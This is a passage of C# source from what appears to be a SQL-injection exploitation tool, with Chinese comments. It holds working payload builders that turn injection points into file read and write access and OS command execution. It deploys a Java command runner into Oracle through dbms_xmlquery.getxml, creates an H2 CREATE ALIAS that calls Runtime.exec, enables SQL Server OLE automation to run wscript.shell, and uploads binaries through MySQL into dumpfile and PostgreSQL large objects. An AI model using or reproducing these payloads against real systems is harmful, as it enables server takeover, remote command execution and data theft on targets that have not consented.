                            Log.Warning("大侠，请在注入中心，配置Bool盲注的判断值！");
                            return;
                        }
                        int count = await DataComm.GetBoolValue(config, countExpr, 0, 100000).ConfigureAwait(false);
                        Log.SysLog("读到文件内容，共有" + count + "行数据！");
                        for (int i = 0; i < count; i++)
                        {
                            config.CheckStop();
                            result.AppendLine(await DataComm.GetStringByBool(config, LineExpr(i), 100000).ConfigureAwait(false));
                            vm.SetFileContent(result.ToString());
                        }
                        break;
                    case InjectType.Union:
                    case InjectType.Error:
                        bool useError = config.DataConfig.SelectedInjectType == InjectType.Error;
                        string countStr = useError
                            ? await DataComm.DataDumpWithError(config, countExpr).ConfigureAwait(false)
                            : await DataComm.DataDumpWithNoFrom(config, countExpr).ConfigureAwait(false);
                        int.TryParse(countStr, out int ucount);
                        Log.SysLog("读到文件内容，共有" + ucount + "行数据！");
                        for (int i = 0; i < ucount; i++)
                        {
                            config.CheckStop();
                            string row = useError
                                ? await DataComm.DataDumpWithError(config, LineExpr(i)).ConfigureAwait(false)
                                : await DataComm.DataDumpWithNoFrom(config, LineExpr(i)).ConfigureAwait(false);
                            result.AppendLine(row);
                            vm.SetFileContent(result.ToString());
                        }
                        break;
                }
                ShowResultLen("读文件完成，内容长度：", result.Length, "（file()仅能读user_files目录内文件）");
            }
            catch (OperationCanceledException)
            {
                Log.Show("已停止文件操作！");
            }
            catch (Exception e)
            {
                Log.Show("读文件发生异常：" + e.Message);
            }
        }

        /// <summary>ClickHouse INTO OUTFILE写文件（已停用：INTO OUTFILE为clickhouse-client客户端侧功能，HTTP接口固定报错358，注入场景不可用；保留实现备查）</summary>
        private static async Task WriteFileByClickHouse(AppConfig config, FileCmdViewModel vm)
        {
            string pathEsc = vm.FilePath.Replace("'", "''", StringComparison.Ordinal);
            string hex = Convert.ToHexString(Encoding.UTF8.GetBytes(vm.FileContent));
            StringBuilder sb = new StringBuilder(" 1=0 union all select ");
            int cols = config.DataConfig.SumColumnCount;
            int showIdx = config.DataConfig.ShowColumnIndex;
            if (cols > 0 && showIdx >= 1 && showIdx <= cols)
            {
                //1=0压制原始行；非显示位用空字符串填充（RawBLOB下空串不产生字节；类型不匹配时需人工调整payload）
                for (int i = 1; i <= cols; i++)
                {
                    sb.Append(i == showIdx ? "unhex('" + hex + "')" : "''");
                    sb.Append(',');
                }
                sb.Remove(sb.Length - 1, 1);
            }
            else
            {
                sb.Append("unhex('" + hex + "')");
            }
            sb.Append(" into outfile '").Append(pathEsc).Append("' format RawBLOB-- ");
            await SendPayload(config, sb.ToString()).ConfigureAwait(false);
            Log.Show("INTO OUTFILE写文件已执行！请人工检查（路径相对ClickHouse服务进程工作目录，readonly=1时不可用）。");
        }

        //==================== Oracle GETXML Java 通道（命令执行+文件读写，免堆叠）====================
        //原理：dbms_xmlquery.getxml 在旧版Oracle（9i~11g）可执行匿名PL/SQL块（自治事务），
        //整个PL/SQL整体hex编码后经 utl_raw.cast_to_varchar2(hextoraw(...)) 还原，彻底规避引号转义。
        //借此在纯SELECT注入（Union/盲注均可）下：CREATE JAVA SOURCE → 创建Java映射函数 → 执行命令/读写文件。
        //版本适用性（2026-09 实测）：23ai Free 上 getxml 拒绝PL/SQL块（Illegal query），18c弃用该包/21c起移除；
        //XE全版本无JVM与DBMS_XMLQUERY。故本通道仅适用 9i~11g（12c未经实测）。DM8无DBMS_XMLQUERY，不适用。
        //前提：账号有 CREATE PROCEDURE 权限且 JVM 可用；返回值限 varchar2(4000)。

        /// <summary>Oracle Java通道已部署目标标识（避免每次命令重复部署）</summary>
        private static string? _oraJavaReadyKey = null;

        /// <summary>GETXML执行外壳：把任意PL/SQL/DDL（整体hex编码）在SELECT表达式内执行</summary>
        private static string OraGetXmlExec(string plsql)
        {
            string hex = Convert.ToHexString(Encoding.UTF8.GetBytes(plsql));
            return "(select to_char(dbms_xmlquery.getxml('declare PRAGMA AUTONOMOUS_TRANSACTION; begin execute immediate utl_raw.cast_to_varchar2(hextoraw(''" + hex + "'')); end;')) from dual)";
        }

        /// <summary>SqliUtil Java源码：runCmd执行命令 / readFile读文件 / writeFile写文件（内容为hex）。换行拼接用 (char)10 而非 "\n" 转义，杜绝任何传输层把转义符还原成真实换行导致Java源损坏</summary>
        private const string OraJavaSource =
            "import java.io.*;\n" +
            "public class SqliUtil {\n" +
            "    public static String runCmd(String cmd) {\n" +
            "        String out = \"\";\n" +
            "        try {\n" +
            "            Process p = Runtime.getRuntime().exec(cmd);\n" +
            "            BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));\n" +
            "            String line;\n" +
            "            while ((line = r.readLine()) != null) { out += line + (char)10; }\n" +
            "            r.close();\n" +
            "        } catch (Exception e) { out = \"ERR:\" + e.getMessage(); }\n" +
            "        return out;\n" +
            "    }\n" +
            "    public static String readFile(String path) {\n" +
            "        String out = \"\";\n" +
            "        try {\n" +
            "            BufferedReader r = new BufferedReader(new FileReader(path));\n" +
            "            String line;\n" +
            "            while ((line = r.readLine()) != null) { out += line + (char)10; }\n" +
            "            r.close();\n" +
            "        } catch (Exception e) { out = \"ERR:\" + e.getMessage(); }\n" +
            "        return out;\n" +
            "    }\n" +
            "    public static String writeFile(String path, String hex) {\n" +
            "        try {\n" +
            "            FileOutputStream f = new FileOutputStream(path);\n" +
            "            for (int i = 0; i + 1 < hex.length(); i += 2) { f.write(Integer.parseInt(hex.substring(i, i + 2), 16)); }\n" +
            "            f.close();\n" +
            "            return \"OK\";\n" +
            "        } catch (Exception e) { return \"ERR:\" + e.getMessage(); }\n" +
            "    }\n" +
            "    public static String readFileHex(String path, int off, int len) {\n" +
            "        try {\n" +
            "            RandomAccessFile r = new RandomAccessFile(path, \"r\");\n" +
            "            r.seek(off);\n" +
            "            byte[] buf = new byte[len];\n" +
            "            int n = r.read(buf);\n" +
            "            r.close();\n" +
            "            if (n <= 0) { return \"\"; }\n" +
            "            char[] hc = \"0123456789abcdef\".toCharArray();\n" +
            "            StringBuilder sb = new StringBuilder(n * 2);\n" +
            "            for (int i = 0; i < n; i++) { int b = buf[i] & 0xff; sb.append(hc[b >> 4]).append(hc[b & 15]); }\n" +
            "            return sb.toString();\n" +
            "        } catch (Exception e) { return \"ERR:\" + e.getMessage(); }\n" +
            "    }\n" +
            "    public static String writeFileBin(String path, String hex, int append) {\n" +
            "        try {\n" +
            "            FileOutputStream f = new FileOutputStream(path, append == 1);\n" +
            "            for (int i = 0; i + 1 < hex.length(); i += 2) { f.write(Integer.parseInt(hex.substring(i, i + 2), 16)); }\n" +
            "            f.close();\n" +
            "            return \"OK\";\n" +
            "        } catch (Exception e) { return \"ERR:\" + e.getMessage(); }\n" +
            "    }\n" +
            "    public static String fileSize(String path) {\n" +
            "        try { return String.valueOf(new File(path).length()); } catch (Exception e) { return \"ERR:\" + e.getMessage(); }\n" +
            "    }\n" +
            "}";

        /// <summary>部署Oracle Java通道：CREATE JAVA SOURCE（hex分块拼接规避字面量4000上限）+ 三个映射函数 + 自检探活</summary>
        private static async Task ProvisionOracleJava(AppConfig config)
        {
            Log.Show("正在通过 GETXML 通道部署 Java 存储过程（SqliUtil）……");
            string srcHex = Convert.ToHexString(Encoding.UTF8.GetBytes(OraJavaSource));
            //CREATE JAVA SOURCE AS 后只接受字面源码（实测ORA-29536，不接受utl_raw表达式），
            //故内层再包一个PL/SQL块：先hex解码到变量，再execute immediate拼出字面源码DDL
            StringBuilder sb = new StringBuilder("declare s varchar2(32767); begin s := ");
            for (int off = 0; off < srcHex.Length; off += 3800)
            {
                if (off > 0)
                {
                    sb.Append(" || ");
                }
                sb.Append("utl_raw.cast_to_varchar2(hextoraw('").Append(srcHex, off, Math.Min(3800, srcHex.Length - off)).Append("'))");
            }
            sb.Append("; execute immediate 'create or replace and compile java source named \"SqliUtil\" as ' || s; end;");
            //所有DDL均为 or replace 幂等：盲注通道多次求值也安全
            await FetchScalar(config, OraGetXmlExec(sb.ToString())).ConfigureAwait(false);
            await FetchScalar(config, OraGetXmlExec("create or replace function SqliEval(p in varchar2) return varchar2 as language java name 'SqliUtil.runCmd(java.lang.String) return java.lang.String'")).ConfigureAwait(false);
            await FetchScalar(config, OraGetXmlExec("create or replace function SqliRead(p in varchar2) return varchar2 as language java name 'SqliUtil.readFile(java.lang.String) return java.lang.String'")).ConfigureAwait(false);
            await FetchScalar(config, OraGetXmlExec("create or replace function SqliWrite(p in varchar2,c in varchar2) return varchar2 as language java name 'SqliUtil.writeFile(java.lang.String,java.lang.String) return java.lang.String'")).ConfigureAwait(false);
            await FetchScalar(config, OraGetXmlExec("create or replace function SqliReadHex(p in varchar2,o in number,l in number) return varchar2 as language java name 'SqliUtil.readFileHex(java.lang.String,int,int) return java.lang.String'")).ConfigureAwait(false);
            await FetchScalar(config, OraGetXmlExec("create or replace function SqliWriteBin(p in varchar2,c in varchar2,a in number) return varchar2 as language java name 'SqliUtil.writeFileBin(java.lang.String,java.lang.String,int) return java.lang.String'")).ConfigureAwait(false);
            await FetchScalar(config, OraGetXmlExec("create or replace function SqliFileSize(p in varchar2) return varchar2 as language java name 'SqliUtil.fileSize(java.lang.String) return java.lang.String'")).ConfigureAwait(false);
            try
            {
                string probe = await FetchScalar(config, "(select SqliEval('echo sqli_ora_ok') from dual)").ConfigureAwait(false);
                if ((probe ?? "").Contains("sqli_ora_ok", StringComparison.Ordinal))
                {
                    Log.Success("Oracle Java通道自检通过（SqliEval已可用）！");
                }
                else
                {
                    Log.Warning("Java通道自检未通过（SqliEval无预期回显）！可能原因：账号无CREATE PROCEDURE权限/DBMS_JAVA不可用/dbms_xmlquery被移除。回显：" + probe);
                }
            }
            catch (Exception e)
            {
                Log.Warning("Java通道自检异常：" + e.Message);
            }
        }

        /// <summary>确保Oracle Java通道就绪（同目标只部署一次；先探测版本，18c+明确告警DBMS_XMLQUERY不可用）</summary>
        private static async Task EnsureOracleJavaReady(AppConfig config)
        {
            string targetKey = config.RequestTxt ?? "";
            if (string.Equals(_oraJavaReadyKey, targetKey, StringComparison.Ordinal))
            {
                return;
            }
            try
            {
                string banner = await FetchScalar(config, "(select banner from v$version where rownum=1)").ConfigureAwait(false);
                Log.SysLog("Oracle版本：" + (banner ?? ""));
                var m = System.Text.RegularExpressions.Regex.Match(banner ?? "", @"(\d+)[a-z]?\.(\d+)", System.Text.RegularExpressions.RegexOptions.IgnoreCase);
                if (m.Success && int.TryParse(m.Groups[1].Value, out int major))
                {
                    if (major >= 18)
                    {
                        Log.Warning("Oracle " + major + " 起 DBMS_XMLQUERY 已弃用（21c+移除/拒绝PL/SQL块），GETXML通道大概率不可用，继续尝试但请勿抱期望……");
                    }
                    else if (major >= 12)
                    {
                        Log.Warning("Oracle 12c 上 GETXML 执行PL/SQL未经实测验证（社区资料确认9i~11g可用），如部署失败属预期。");
                    }
                }
            }
            catch (Exception)
            {
            }
            if (config.DataConfig.SelectedInjectType.Equals(InjectType.Blind) || config.DataConfig.SelectedInjectType.Equals(InjectType.Time))
            {
                Log.Show("提示：盲注通道部署Java过程较慢（取值需多次求值），建议优先Union通道……");
            }
            await ProvisionOracleJava(config).ConfigureAwait(false);
            _oraJavaReadyKey = targetKey;
        }

        /// <summary>Oracle/DM Java命令执行（GETXML通道，首次自动部署SqliUtil）</summary>
        private static async Task ExecuteCmdOracle(AppConfig config, FileCmdViewModel vm)
        {
            try
            {
                await EnsureOracleJavaReady(config).ConfigureAwait(false);
                string cmdHex = Convert.ToHexString(Encoding.UTF8.GetBytes(vm.CmdText));
                Log.SysLog("命令已执行：" + vm.CmdText);
                string result = await FetchScalar(config, "(select SqliEval(utl_raw.cast_to_varchar2(hextoraw('" + cmdHex + "'))) from dual)").ConfigureAwait(false);
                vm.SetCmdResult(result);
                ShowResultLen("命令执行完成，获取到结果长度：", (result ?? "").Length, "（varchar2上限4000字符；管道/重定向请自行加 cmd /c 或 /bin/sh -c）");
            }
            catch (OperationCanceledException)
            {
                Log.Show("已停止命令执行！");
            }
            catch (Exception e)
            {
                Log.Show("命令执行发生异常：" + e.ToString());
            }
        }

        /// <summary>Oracle/DM Java读文件（SqliRead按文本逐行读取，varchar2上限4000字符）</summary>
        private static async Task ReadFileByOracleJava(AppConfig config, FileCmdViewModel vm)
        {
            try
            {
                await EnsureOracleJavaReady(config).ConfigureAwait(false);
                string pathHex = Convert.ToHexString(Encoding.UTF8.GetBytes(vm.FilePath));
                string result = await FetchScalar(config, "(select SqliRead(utl_raw.cast_to_varchar2(hextoraw('" + pathHex + "'))) from dual)").ConfigureAwait(false);
                vm.SetFileContent(result ?? "");
                ShowResultLen("读文件完成，内容长度：", (result ?? "").Length, "（varchar2上限4000字符，二进制文件请用其他通道）");
            }
            catch (OperationCanceledException)
            {
                Log.Show("已停止文件操作！");
            }
            catch (Exception e)
            {
                Log.Show("读文件发生异常：" + e.Message);
            }
        }

        /// <summary>Oracle/DM Java写文件（SqliWrite内容按hex解码落盘，hex后受varchar2(4000)限制约2000字节）</summary>
        private static async Task WriteFileByOracleJava(AppConfig config, FileCmdViewModel vm)
        {
            try
            {
                await EnsureOracleJavaReady(config).ConfigureAwait(false);
                string pathHex = Convert.ToHexString(Encoding.UTF8.GetBytes(vm.FilePath));
                string contentHex = Convert.ToHexString(Encoding.UTF8.GetBytes(vm.FileContent));
                if (contentHex.Length > 4000)
                {
                    Log.Warning("文件内容hex后超过4000字符（约2000字节），超出varchar2传参上限，请精简内容或分多次写入！");
                    return;
                }
                //SqliWrite第二参是hex字符串本身（纯[0-9A-F]无引号风险，直接字面量）；注意不能再套hextoraw，否则Java收到的是解码后的原文
                string result = await FetchScalar(config, "(select SqliWrite(utl_raw.cast_to_varchar2(hextoraw('" + pathHex + "')),'" + contentHex + "') from dual)").ConfigureAwait(false);
                if ((result ?? "").StartsWith("OK", StringComparison.Ordinal))
                {
                    Log.Success("写文件完成！目标：" + vm.FilePath);
                }
                else
                {
                    Log.Warning("写文件回执异常：" + result + "（请检查路径权限与Java通道自检日志）");
                }
            }
            catch (OperationCanceledException)
            {
                Log.Show("已停止文件操作！");
            }
            catch (Exception e)
            {
                Log.Show("写文件发生异常：" + e.Message);
            }
        }

        //==================== H2 CREATE ALIAS 命令执行（需H2 1.x+JDK编译器，堆叠注入）====================

        /// <summary>H2 SQX别名函数是否已创建（本次会话内复用）</summary>
        private static bool _h2AliasReady = false;

        /// <summary>H2 CREATE ALIAS命令执行：堆叠建Java函数别名SQX（$$美元引用规避引号），取值走当前通道</summary>
        private static async Task ExecuteCmdH2(AppConfig config, FileCmdViewModel vm)
        {
            if (!config.DataConfig.SelectedInjectType.Equals(InjectType.Stacked) && !TryAutoSwitchStacked(config, "H2命令执行"))
            {
                //H2 JDBC单execute可执行多语句（CommandList），堆叠能力与注入点类型无关（同PG UDF策略：尝试发送而非直接拒绝）
                Log.Warning("提示：当前注入点非堆叠类型，CREATE ALIAS仍以堆叠形式尝试发送（H2驱动支持单请求多语句时可用）！");
            }
            try
            {
                if (!_h2AliasReady)
                {
                    //Java源码内 useDelimiter("\\A") 读全量输出；$$美元引用包裹规避引号转义
                    string javaSrc = "String sqx(String cmd) throws Exception { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\"\\\\A\"); return s.hasNext() ? s.next() : \"\"; }";
                    await SendPayload(config, " 1=1;drop alias if exists SQX;create alias SQX as $$" + javaSrc + "$$;-- ").ConfigureAwait(false);
                    _h2AliasReady = true;
                    Log.Show("H2 CREATE ALIAS函数SQX已创建（需JDK编译器可用：javax.tools.JavaCompiler，JRE/精简运行环境不可用；实测H2 1.4与2.x均支持）！");
                }
                //命令char链编码规避引号；别名函数可直接在表达式中引用
                string chain = TextCodec.StrToChrOrChar(vm.CmdText, "char", "||", "UTF-8");
                Log.SysLog("命令已执行：" + vm.CmdText);
                string result = await FetchScalar(config, "SQX(" + chain + ")").ConfigureAwait(false);
                vm.SetCmdResult(result ?? "");
                ShowResultLen("命令执行完成，获取到结果长度：", (result ?? "").Length);
            }
            catch (OperationCanceledException)
            {
                Log.Show("已停止命令执行！");
            }
            catch (Exception e)
            {
                Log.Show("命令执行发生异常：" + e.ToString());
            }
        }

        //==================== SQLServer sp_OACreate 命令执行（xp_cmdshell被删除时的备用通道，需sysadmin+堆叠）====================

        /// <summary>SQLServer sp_OACreate(wscript.shell)执行命令：输出重定向到临时文件，再经BULK INSERT通道回读</summary>
        private static async Task ExecuteCmdSqlServerOle(AppConfig config, FileCmdViewModel vm)
        {
            try
            {
                string outFile = "C:/Windows/Temp/ssqlo" + MyTools.RandStr(4).ToLower() + ".txt";
                string StripStackedPrefix(string p) => config.DataConfig.IsTimeChannel ? p.Replace(" 1=1;", ";", StringComparison.Ordinal) : p;
                string OleRun(string cmdline) => StripStackedPrefix(" 1=1;declare @s int;exec [master]..[sp_oacreate] 'wscript.shell',@s out;exec [master]..[sp_oamethod] @s,'run',null,'" + cmdline.Replace("'", "''", StringComparison.Ordinal) + "',0,true;exec [master]..[sp_oadestroy] @s;-- ");
                await SendPayload(config, StripStackedPrefix(" 1=1;exec sp_configure 'show advanced options',1;reconfigure;exec sp_configure 'ole automation procedures',1;reconfigure;-- ")).ConfigureAwait(false);
                string winOut = outFile.Replace('/', '\\');
                await SendPayload(config, OleRun("cmd /c " + vm.CmdText + " > \"" + winOut + "\" 2>&1")).ConfigureAwait(false);
                Log.SysLog("命令已执行（sp_OACreate wscript.shell）：" + vm.CmdText);
                if (!vm.CmdShowResult)
                {
                    Log.Show("命令执行完成（未开启回显）！");
                    return;
                }
                string result = await ReadSqlServerFileText(config, outFile).ConfigureAwait(false);
                vm.SetCmdResult(result);
                ShowResultLen("命令执行完成，获取到结果长度：", (result ?? "").Length);
                try
                {
                    await SendPayload(config, OleRun("cmd /c del /f /q \"" + winOut + "\"")).ConfigureAwait(false);
                }
                catch (Exception)
                {
                }
            }
            catch (OperationCanceledException)
            {
                Log.Show("已停止命令执行！");
            }
            catch (Exception e)
            {
                Log.Show("命令执行发生异常：" + e.ToString());
            }
        }

        /// <summary>SQLServer BULK INSERT读文件并返回文本（sp_OACreate命令输出回读共用）</summary>
        private static async Task<string> ReadSqlServerFileText(AppConfig config, string path)
        {
            string readPayload = PayloadFactory.BasePayload.Get("FileReadBulk").Replace("{path}", path, StringComparison.Ordinal);
            return await ReadSqlServerScalar(config, readPayload, PayloadFactory.BasePayload.Get("FileContent")).ConfigureAwait(false);
        }

        /// <summary>
        /// SQLServer通用标量回读：先发堆叠setup语句（建临时表/装数据），再经当前取数通道读取一个标量结果，最后清理临时表
        /// </summary>
        private static async Task<string> ReadSqlServerScalar(AppConfig config, string setupPayload, string selectSql)
        {
            string dropTable = PayloadFactory.BasePayload.Get("CmdDropTable");
            if (config.DataConfig.IsTimeChannel)
            {
                dropTable = dropTable.Replace(" 1=1;", ";", StringComparison.Ordinal);
                setupPayload = setupPayload.Replace(" 1=1;", ";", StringComparison.Ordinal);
            }
            await SendPayload(config, setupPayload).ConfigureAwait(false);
            try
            {
                switch (config.DataConfig.SelectedInjectType)
                {
                    case InjectType.Union:
                        return await DataComm.DataDumpWithNoFrom(config, selectSql).ConfigureAwait(false);
                    case InjectType.Error:
                        return await DataComm.DataDumpWithError(config, selectSql).ConfigureAwait(false);
                    default:
                        if (string.IsNullOrEmpty(config.DataConfig.CheckValue))
                        {
                            Log.Warning("大侠，请在注入中心，配置Bool盲注的判断值！");
                            return "";
                        }
                        return (await DataComm.GetStringByBool(config, selectSql, 1024 * 100).ConfigureAwait(false)) ?? "";
                }
            }
            finally
            {
                try
                {
                    await SendPayload(config, dropTable).ConfigureAwait(false);
                }
                catch (Exception)
                {
                }
            }
        }
        //==================== 二进制文件上传/下载（hex 分片传输，字节级无损）====================
        //传输设计：服务端表达式统一产出 ASCII hex 字符串（MySQL hex() / PG encode() / SQLServer convert(...,2) /
        //Oracle Java hex / ClickHouse hex()），按当前注入通道取回（Union整取/报错分片/盲注逐字符），
        //本地 Convert.FromHexString 还原字节直接落盘——全程不过文本编码，二进制无损。

        /// <summary>按当前注入通道取回ASCII hex字符串（Union整取/报错按探针步长分片/盲注按字符）</summary>
        private static async Task<string> FetchHexString(AppConfig config, string hexExpr, int maxHexLen)
        {
            switch (config.DataConfig.SelectedInjectType)
            {
                case InjectType.Union:
                    return ((await DataComm.DataDumpWithNoFrom(config, hexExpr).ConfigureAwait(false)) ?? "").Trim();
                case InjectType.Error:
                    string lenStr = await DataComm.DataDumpWithError(config, PayloadFactory.BPTool.DataLen(hexExpr)).ConfigureAwait(false);
                    int.TryParse(lenStr, out int sumlen);
                    if (sumlen <= 0)
                    {
                        return "";
                    }
                    Log.SysLog("hex数据长度：" + sumlen);
                    int step = await DataComm.GetErrorChunkStep(config).ConfigureAwait(false);
                    StringBuilder sb = new StringBuilder(sumlen);
                    for (int s = 1; s <= sumlen; s += step)
                    {
                        config.CheckStop();
                        sb.Append(await DataComm.DataDump(config, PayloadFactory.BPTool.ErrorDataSubstr(hexExpr, s, step)).ConfigureAwait(false));
                    }
                    return sb.ToString().Trim();
                default:
                    //快通道优先：同参数有可用Union/Error记录时一次请求取hex（二进制下载免于逐字符盲注）
                    string? upgradedHex = await DataComm.TryUpgradeFetch(config, hexExpr, maxHexLen).ConfigureAwait(false);
                    if (upgradedHex != null)
                    {
                        return upgradedHex.Trim();
                    }
                    if (string.IsNullOrEmpty(config.DataConfig.CheckValue))
                    {
                        Log.Warning("大侠，请在注入中心，配置Bool盲注的判断值！");
                        return "";
                    }
                    //hex串为纯ASCII，通用盲注取值走ASCII快车道
                    return ((await DataComm.GetStringByBool(config, hexExpr, maxHexLen).ConfigureAwait(false)) ?? "").Trim();
            }
        }

        /// <summary>hex字符串还原字节（去空白/0x前缀，容忍奇数长度截尾）</summary>
        private static byte[] HexToBytes(string hex)
        {
            StringBuilder sb = new StringBuilder(hex.Length);
            foreach (char c in hex)
            {
                if (!char.IsWhiteSpace(c))
                {
                    sb.Append(c);
                }
            }
            string clean = sb.ToString();
            if (clean.StartsWith("0x", StringComparison.OrdinalIgnoreCase))
            {
                clean = clean.Substring(2);
            }
            if (clean.Length % 2 != 0)
            {
                clean = clean.Substring(0, clean.Length - 1);
            }
            if (clean.Length == 0)
            {
                return Array.Empty<byte>();
            }
            try
            {
                return Convert.FromHexString(clean);
            }
            catch (FormatException)
            {
                Log.Warning("hex数据含非法字符，二进制还原失败（目标可能被WAF干扰或通道异常）！");
                return Array.Empty<byte>();
            }
        }

        /// <summary>上传分片大小（字节）：GET注入URL长度受限用小片，POST用大片</summary>
        private static int UploadChunkSize(AppConfig config, int max)
        {
            bool isGet = (config.RequestTxt ?? "").TrimStart().StartsWith("GET", StringComparison.OrdinalIgnoreCase);
            return Math.Min(max, isGet ? 1200 : 6000);
        }

        /// <summary>二进制下载收尾：字节交给ViewModel并输出日志</summary>
        private static void FinishBinaryDownload(FileCmdViewModel vm, byte[] data, string emptyHint)
        {
            vm.SetFileBytes(data);
            if (data.Length == 0)
            {
                Log.Warning("二进制下载结果为空！" + emptyHint);
            }
            else
            {
                Log.Success("二进制下载完成，共 " + data.Length + " 字节！请点击「保存到本地」落盘。");
            }
        }

        /// <summary>取待上传字节（未选择本地文件时告警并返回null）</summary>
        private static byte[]? RequireUploadBytes(FileCmdViewModel vm)
        {
            byte[]? data = vm.FileBytes;
            if (data == null || data.Length == 0)
            {
                Log.Warning("请先点击「选择文件」选择要上传的本地文件！");
                return null;
            }
            return data;
        }

        //---------- MySQL：hex(load_file()) 下载 / 临时表分片+dumpfile 上传 ----------

        /// <summary>MySQL 二进制下载：hex(load_file(0x路径)) 取hex串（全注入通道可用）</summary>
        private static async Task BinaryDownloadMySQL(AppConfig config, FileCmdViewModel vm)
        {
            string pathHex = TextCodec.StrToHex(vm.FilePath, "UTF-8");
            Log.Show("二进制下载：" + vm.FilePath + " ……");
            string hex = await FetchHexString(config, "(hex(load_file(" + pathHex + ")))", 64 * 1024 * 1024).ConfigureAwait(false);
            FinishBinaryDownload(vm, HexToBytes(hex), "可能原因：文件不存在/无读权限/secure_file_priv限制/盲注判断值未配置。");
        }

        /// <summary>MySQL 二进制上传：Union小文件单发 0x..into dumpfile；堆叠临时表分片+order by id into dumpfile；写后length(load_file)验证</summary>
        private static async Task BinaryUploadMySQL(AppConfig config, FileCmdViewModel vm)
        {
            byte[]? data = RequireUploadBytes(vm);
            if (data == null)
            {
                return;
            }
            string pathEsc = vm.FilePath.Replace("\\", "/", StringComparison.Ordinal).Replace("'", "''", StringComparison.Ordinal);
            if (!config.DataConfig.SelectedInjectType.Equals(InjectType.Union)
                && !config.DataConfig.SelectedInjectType.Equals(InjectType.Stacked)
                && !TryAutoSwitchStacked(config, "二进制上传"))
            {
                Log.Warning("二进制上传只支持Union/堆叠注入（盲注/时间通道无法执行into dumpfile写操作）！");
                return;
            }
            bool useUnion = config.DataConfig.SelectedInjectType.Equals(InjectType.Union);
            if (useUnion && data.Length > 4000)
            {
                //Union单发超限：注入记录中有堆叠通道时自动降级堆叠分片上传，无记录才拒绝
                if (!TryAutoSwitchStacked(config, "二进制上传（超4KB）"))
                {
                    Log.Warning("Union单发上传超过4KB（" + data.Length + "字节），URL/请求体可能超限，且注入记录中无堆叠通道可降级，请改用堆叠注入点！");
                    return;
                }
                useUnion = false;
            }
            if (useUnion)
            {
                int columnsLen = config.DataConfig.SumColumnCount;
                int showIndex = config.DataConfig.ShowColumnIndex;
                StringBuilder sb = new StringBuilder(" 1=2 union select ");
                for (int i = 1; i <= columnsLen; i++)
                {
                    sb.Append(i == showIndex ? "0x" + Convert.ToHexString(data) : "x''");
                    sb.Append(',');
                }
                sb.Remove(sb.Length - 1, 1);
                sb.Append(" into dumpfile '").Append(pathEsc).Append("'");
                Log.Show("Union二进制上传（" + data.Length + "字节）……");
                await SendPayload(config, sb.ToString()).ConfigureAwait(false);
            }
            else
            {
                //堆叠分片：临时表存blob片段，order by id into dumpfile 按序拼接落盘
                int chunkSize = UploadChunkSize(config, 6000);
                int chunks = (data.Length + chunkSize - 1) / chunkSize;
                Log.Show("堆叠分片二进制上传（" + data.Length + "字节，" + chunks + "片×" + chunkSize + "字节）……");
                await SendPayload(config, " 1=1;drop table if exists ssqlibin;create table ssqlibin(id int auto_increment primary key, d longblob);select 1 where 1=1 ").ConfigureAwait(false);
                try
                {
                    for (int i = 0; i < chunks; i++)
                    {
                        config.CheckStop();
                        int off = i * chunkSize;
                        int len = Math.Min(chunkSize, data.Length - off);
                        await SendPayload(config, " 1=1;insert into ssqlibin(d) values(0x" + Convert.ToHexString(data, off, len) + ");select 1 where 1=1 ").ConfigureAwait(false);
                        Log.SysLog("已上传分片 " + (i + 1) + "/" + chunks);
                    }
                    //INTO DUMPFILE多行不可靠（实测5行仅落盘2行），先group_concat聚合成单行再落盘；
                    //group_concat_max_len默认1024必须调大，blob参数使结果保持二进制串
                    await SendPayload(config, " 1=1;set session group_concat_max_len=1073741824;select group_concat(d order by id separator '') from ssqlibin into dumpfile '" + pathEsc + "';select 1 where 1=1 ").ConfigureAwait(false);
                }
                finally
                {
                    try
                    {
                        await SendPayload(config, " 1=1;drop table if exists ssqlibin;select 1 where 1=1 ").ConfigureAwait(false);
                    }
                    catch (Exception)
                    {
                    }
                }
            }
            //写后验证：length(load_file) 比对字节数
            await VerifyMySqlWrite(config, vm.FilePath, data.Length).ConfigureAwait(false);
        }

        //---------- PostgreSQL：大对象 encode/decode hex 双向（Union/报错/堆叠） ----------

        /// <summary>PG二进制大对象通道保障：盲注/时间通道时优先自动切换堆叠记录（二进制分页读写走SendStackedStmt不依赖回显），再回落Union/报错校验</summary>
        private static bool EnsurePgBinaryChannel(AppConfig config, ref bool stacked)
        {
            if (!stacked
                && !config.DataConfig.SelectedInjectType.Equals(InjectType.Union)
                && !config.DataConfig.SelectedInjectType.Equals(InjectType.Error))
            {
                stacked = TryAutoSwitchStacked(config, "大对象二进制读写");
            }
            return stacked || EnsurePgLoChannel(config);
        }

        /// <summary>PG 二进制下载：lo_import导入→pg_largeobject取encode hex→lo_unlink清理（需superuser或pg_read_server_files；堆叠/Union/报错通道）</summary>
        private static async Task BinaryDownloadPg(AppConfig config, FileCmdViewModel vm)
        {
            bool stacked = config.DataConfig.SelectedInjectType.Equals(InjectType.Stacked);
            if (!EnsurePgBinaryChannel(config, ref stacked))
            {
                return;
            }
            int oid = 90300 + new Random().Next(0, 6000);
            string pathEsc = vm.FilePath.Replace("'", "''", StringComparison.Ordinal);
            Log.Show("二进制下载：" + vm.FilePath + "（loid=" + oid + "）……");
            try
            {
                if (stacked)
                {
                    await SendStackedStmt(config, "select lo_import('" + pathEsc + "'," + oid + ")").ConfigureAwait(false);
                }
                else
                {
                    await FetchScalar(config, "(select lo_import('" + pathEsc + "'," + oid + "))").ConfigureAwait(false);
                }
                string hex = await FetchHexString(config, "(select coalesce(string_agg(encode(data,'hex'),'' order by pageno),'') from pg_largeobject where loid=" + oid + ")", 64 * 1024 * 1024).ConfigureAwait(false);
                FinishBinaryDownload(vm, HexToBytes(hex), "可能原因：文件不存在/无读权限（需superuser或pg_read_server_files）/盲注判断值未配置。");
            }
            finally
            {
                try
                {
                    if (stacked)
                    {
                        await SendStackedStmt(config, "select lo_unlink(" + oid + ")").ConfigureAwait(false);
                    }
                    else
                    {
                        await FetchScalar(config, "(select lo_unlink(" + oid + "))").ConfigureAwait(false);
                    }
                }
                catch (Exception)
                {
                }
            }
        }

        /// <summary>PG 二进制上传：堆叠分页写pg_largeobject+lo_export；Union/报错小文件lo_from_bytea单发；写后sum(length(data))验证（需superuser或pg_write_server_files）</summary>
        private static async Task BinaryUploadPg(AppConfig config, FileCmdViewModel vm)
        {
            byte[]? data = RequireUploadBytes(vm);
            if (data == null)
            {
                return;
            }
